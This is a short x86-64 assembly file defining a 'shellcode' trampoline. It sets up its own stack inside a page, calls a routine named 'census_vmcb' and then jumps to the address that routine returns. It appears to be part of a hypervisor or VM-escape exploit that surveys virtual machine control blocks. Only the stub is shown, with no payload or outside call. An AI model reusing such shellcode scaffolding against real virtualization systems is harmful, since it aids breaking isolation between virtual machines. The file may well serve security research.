.intel_syntax noprefix
.text
.global shellcode
.type shellcode, @function

// page+0x000 - code, at most 0x800 bytes
// page+0xf00 - params, with the stack growing down from there
shellcode:
    lea     rsp, [rip + 0xef9]
    push    rbx
    push    rsi
    push    rdi
    sub     rsp, 8
    lea     rbx, [rsp + 0x20]
    mov     rdi, rbx
    call    census_vmcb
    mov     rcx, qword ptr [rbx]
    add     rsp, 8
    pop     rdi
    pop     rsi
    pop     rbx
    jmp     rcx
.size shellcode, .-shellcode

.section .note.GNU-stack,"",@progbits
